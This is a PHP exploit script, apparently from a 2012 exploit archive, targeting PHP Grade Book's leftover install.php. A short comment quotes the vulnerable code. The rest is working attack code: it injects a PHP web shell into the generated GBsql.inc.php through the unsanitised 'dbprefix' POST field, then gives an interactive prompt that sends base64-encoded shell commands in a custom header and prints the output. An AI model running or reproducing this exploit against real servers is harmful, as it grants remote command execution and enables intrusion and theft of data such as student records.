<?php
/*
+------------------------------------------------------------------+
+ PHP Grade Book Remote Code Execution                             + 
+------------------------------------------------------------------+
  
Web-App        : PHP Grade Book (ALL VER)
Vendor         : http://www.phpgradebook.com/
Vulnerability  : Remote Code Execution
Author         : Adel SBM
Facebook       : http://www.facebook.com/adel.sbm
Websites       : [www.The-code.tk]-[www.dz-root.com]-[www.sec4ever.com]
Tested on      : Windows XP SP2

SCREENSHOT     : http://imgtk.tk/?img=71343364971.png

                         
+-------------------------------------------------------------------+
+                         Algeria                                   + 
+                        17/07/2012                                 + 
+-------------------------------------------------------------------+

    [-] vulnerable code in install.php (This file is still exist even after the installation is finished !!)
	
47.   if($_GET[Step]==3) {
48.   echo ("<table border=1 cellspacing=0 cellpadding=0 width=100%><tr><td><a href=install.php?Step=1>Step 1</td>
49.   	<td><a href=install.php?Step=2>Retry Step 2</td><td><a href=install.php?Step=3>Retry Step 3<td>
50.   	</tr></table><br>");
51.   
52.   	if($_POST[SaveSql]==1) {
53.   		$SqlSave=('<?php '."\n".'
54.   	$host = "'.$_POST[host].'";
55. 	$user = "'.$_POST[user].'";
56. 	$pass = "'.$_POST[pass].'";
57. 	$dbname = "'.$_POST[dbname].'";
58. 	$dbprefix = "'.$_POST[dbprefix].'";
59. 
60. 	$LangFile = "'.$_POST[LangFile].'";
61. 
62. ?>');
63.
64. 		$fopen = fopen("GBsql.inc.php", "w");
65. 		fwrite($fopen, "$SqlSave");  
66. 		fclose($fopen);
67. 	}

    [-] An attacker might be able to inject and execute PHP code on 'GBsql.inc.php' file through $_POST ..
*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

define(STDIN, fopen("php://stdin", "r"));

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print "\n[-] No response from {$host}:80 Trying again...";
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

print "\n+------------------------------------------------------------------------+";
print "\n| PHP Grade Book Remote Code Execution BY : AdelSBM                      |";
print "\n| Greetz to: The Don                                                     |";
print "\n| Algeria                                                                |";
print "\n+------------------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nUsage......: php $argv[0] host path\n";
	print "\nExample....: php $argv[0] localhost /";
	print "\nExample....: php $argv[0] localhost /phpgradebook/\n";
	die();
}


$host = $argv[1];
$path = $argv[2];


$payload = 'host=localhost&user=root&pass=root&dbname=dbname&SaveSql=1&LangFile=lang/default.lang&dbprefix=." ?><?php print("_code_"); passthru(base64_decode($_SERVER[HTTP_CMD])); die; ?><? ".&submit=Continue to step 3';
$packet  = "POST {$path}admin/install.php?Step=3 HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Referer: {$path}admin/install.php?Step=2 \r\n";
$packet .= "Cmd: %s\r\n";
$packet .= "Content-Length: ".(strlen($payload)-1)."\r\n";
$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet .= "Connection: close\r\n\r\n";
$packet .= $payload;

http_send($host, $packet);

$packet  = "GET {$path}admin/GBsql.inc.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cmd: %s\r\n";
$packet .= "Connection: close\r\n\r\n";

while(1)
{
	print "\n@AdelSBM# ";
	$cmd = trim(fgets(STDIN));
	if ($cmd != "exit")
	{
		$html  = http_send($host, sprintf($packet, base64_encode($cmd)));
		$shell = explode("_code_", $html);
		preg_match("/_code_/", $html) ? print "\n{$shell[1]}" : die("\n[-] Exploit failed...\n");
	}
	else break;
}

?>
